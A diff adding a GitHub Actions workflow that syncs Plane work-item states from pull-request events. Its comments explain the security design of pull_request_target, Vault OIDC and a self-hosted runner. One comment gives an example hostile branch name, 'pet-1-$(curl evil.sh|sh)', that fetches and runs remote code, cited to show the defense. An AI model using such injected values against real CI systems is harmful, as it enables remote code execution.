@@ -1,0 +1,99 @@
+# Plane work-item sync — the replacement for the GitHub↔Linear auto-advance.
+name: plane-sync
+
+# WHY pull_request_target AND NOT pull_request (this is the load-bearing decision).
+#
+# PET-104 deliberately removed the `pull_request` sub from the github-actions Vault
+# role: this is a PUBLIC repo with a self-hosted runner inside the homelab, so a PR
+# run executes PR-CONTROLLED workflow code next to live credentials. That rule stands.
+#
+# `pull_request_target` runs the workflow file from the BASE branch (main), not from
+# the PR. So the code below is always the reviewed-and-merged version — a PR cannot
+# change what runs. We therefore:
+#   * NEVER check out the PR head (the default checkout here is base, and we keep it)
+#   * read ONLY event metadata (head ref, PR url, number)
+#   * mint a token whose entire blast radius is "can change a work item's state"
+#
+# ⚠️ Both `pull_request` and `pull_request_target` present the SAME OIDC subject,
+# `repo:PeteDio-Labs/petedio-iac:pull_request`. The plane-ci Vault role binds that
+# subject, so an ordinary PR *can* also mint this token. That is accepted, and it is
+# why the plane-ci policy reads exactly one secret (vault-config/policies.tf).
+# It must NEVER be widened to a policy that reaches Proxmox/MinIO/Cloudflare.
+on:
+  pull_request_target:
+    types: [opened, reopened, ready_for_review, converted_to_draft, closed]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  # One sync per PR; a rapid open→ready→merge must not race itself into a stale state.
+  group: plane-sync-${{ github.event.pull_request.number || github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  sync:
+    # Self-hosted because Plane is LAN-only — a GitHub-hosted runner cannot reach it.
+    runs-on: [self-hosted, linux, x64, homelab]
+    permissions:
+      contents: read
+      id-token: write # mint the OIDC token vault-action exchanges for a Vault token
+    env:
+      VAULT_ADDR: https://192.168.50.223:8200
+      PLANE_BASE_URL: ${{ vars.PLANE_BASE_URL }}
+      PLANE_WORKSPACE: ${{ vars.PLANE_WORKSPACE }}
+      PLANE_PROJECT_ID: ${{ vars.PLANE_PROJECT_ID_IAC }}
+
+    steps:
+      # Checks out the BASE branch (pull_request_target default). Do not add `ref:` to
+      # point this at the PR head — that is exactly the vulnerability this trigger avoids.
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      # Decide the transition from the event, in the runner (not in a shell string).
+      - name: Resolve transition
+        id: t
+        env:
+          ACTION: ${{ github.event.action }}
+          MERGED: ${{ github.event.pull_request.merged }}
+          IS_DRAFT: ${{ github.event.pull_request.draft }}
+        run: |
+          case "$ACTION" in
+            opened|reopened)      T=$([ "$IS_DRAFT" = "true" ] && echo in-progress || echo in-review) ;;
+            ready_for_review)     T=in-review ;;
+            converted_to_draft)   T=in-progress ;;
+            closed)               T=$([ "$MERGED" = "true" ] && echo done || echo todo) ;;
+            *)                    T=skip ;;
+          esac
+          echo "transition=$T" >> "$GITHUB_OUTPUT"
+          echo "resolved '$ACTION' (merged=$MERGED draft=$IS_DRAFT) -> $T"
+
+      - name: Encode Vault CA
+        if: steps.t.outputs.transition != 'skip'
+        id: vault_ca
+        run: echo "b64=$(base64 -w0 environments/homelab/vault-ca.crt)" >> "$GITHUB_OUTPUT"
+
+      - name: Vault — mint the Plane token via OIDC
+        if: steps.t.outputs.transition != 'skip'
+        uses: hashicorp/vault-action@892a26828f195e65540a40b4768ae4571f51ebfc # v4.0.0
+        with:
+          url: https://192.168.50.223:8200
+          method: jwt
+          path: jwt-github
+          role: plane-ci
+          jwtGithubAudience: https://github.com/PeteDio-Labs
+          caCertificate: ${{ steps.vault_ca.outputs.b64 }}
+          exportToken: false
+          secrets: |
+            kv/data/services/plane api_key | PLANE_API_KEY
+
+      # INJECTION NOTE: HEAD_REF is attacker-controlled — anyone can open a PR from a
+      # branch named `pet-1-$(curl evil.sh|sh)`. It is passed as an ENV VAR and never
+      # interpolated into a shell string, and plane-sync.sh only ever regex-matches it.
+      - name: Sync Plane
+        if: steps.t.outputs.transition != 'skip'
+        env:
+          PLANE_TRANSITION: ${{ steps.t.outputs.transition }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+        run: ./scripts/plane-sync.sh
